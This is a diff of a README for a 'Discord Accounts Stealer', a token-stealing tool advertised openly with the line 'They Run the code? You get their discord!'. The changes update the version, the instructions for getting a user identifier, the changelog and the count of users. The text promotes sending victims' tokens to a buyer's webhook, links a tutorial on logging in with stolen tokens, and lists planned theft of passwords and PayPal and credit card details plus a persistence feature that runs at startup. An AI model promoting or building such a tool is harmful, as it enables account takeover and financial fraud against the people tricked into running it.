@@ -1,4 +1,4 @@
-## 🔑 Discord Accounts Stealer 2.6.2
+## 🔑 Discord Accounts Stealer 2.6.1
 > **If not the best and easiest discord token stealing software script! :tada:**
 
 > **🤖 They Run the code? You get their discord! - It's that easy!**
@@ -12,7 +12,7 @@
 - **Searches Account Duplications _(Will not send the same account twice)_**
 
 ### 🖼 Program Screenshots
->![DiscordMessageImage](https://cdn.agamsol.xyz:90/media/DiscordCanary_YQRHVhs8nG.png "Discord message of  account")
+>![DiscordMessageImage](https://cdn.agamsol.xyz:90/media/DiscordDevelopment_Lr8w1LyJ2L.png "Discord message of  account")
 >![Desktop Notifications](https://cdn.agamsol.xyz:90/media/chrome_4L0SQJGJwb.png "The Process has been ended successfully.")
 
 ### 🚀 Builds that are being scanned
@@ -20,9 +20,10 @@
 
 ## 🛒 Getting Started
 ##### :warning: Already own 2.5 identifier?
-- Collect your identifier from the purple message that was sent to your webhook _(A Combination of 10 Digits - `XXXXX-XXXXX`)_
-- go to the  [`🤖 ┋ commands`](https://discord.com/channels/847289537566474250/861547289071058944) channel
-- type `!cmd XXXXX-XXXXX` _(if the bot is offline please ping staff)_
+- You do not need to create another identifier.
+- the command you have will now run version 2.6.1
+- **NOTE: You Should really ask us for the new command as it fixes some SSL issues and adds silent mode feature**
+
 #### ⛩ Lets Create your Identifier?
 
 - **To get started you need to join our [Discord server](https://discord.gg/PUxp8KmRv5)**
@@ -36,12 +37,12 @@
 ##### 🔌 LOGIN TO ACCOUNS USING TOKEN: Watch the [Tutorial](https://youtu.be/u_oF1gEYTBk) to see how to login to the Account.
 
 ## 📝 What's New?
-- Added New Parameter to main script - `--no-notify` _(force to not send desktop notifications)_
-- if identifier is not provided print an error _(Command Prompt window - if not hidden)_
-- Fixed bug, When error occurs window forced exits _(even if called from CMD)_
+- Error messages are fixed and loading all DATA _(High Priority Queque)_
+- Improved parameters system _(now accepts quoted `"strings"`)_
+- Will not add failure stats when the identifier is disabled.
 
 ## 💡 Plans for the feature
-- Include Billing information in the discord message - if its Paypal, Credit Card
+- Include Billing information in the discord message - Paypal, Credit Card Information
 - Include the password of the account
 - **Discord Startup update?** - The script will run in each startup and scan for password changes or accounts that were added and it will send and update each change to keep you updated.
 
@@ -49,7 +50,7 @@
 ### 💲 Buy me a coffee?
 I wanted to say huge thanks to everyone who use this software :heart:
 
-We already have 80+ identifiers that are enjoying this amazing software!
+We already have 40+ identifiers that are enjoying this amazing software!
 
 We are waiting for you in our discord server!
 > Make someone's day and buy him a cup of coffee for his hard job? <a href="https://www.paypal.me/agamsolomon0011" rel="paypal donations">![donate](https://img.shields.io/badge/Donate-Paypal-brightgreen.svg)</a>
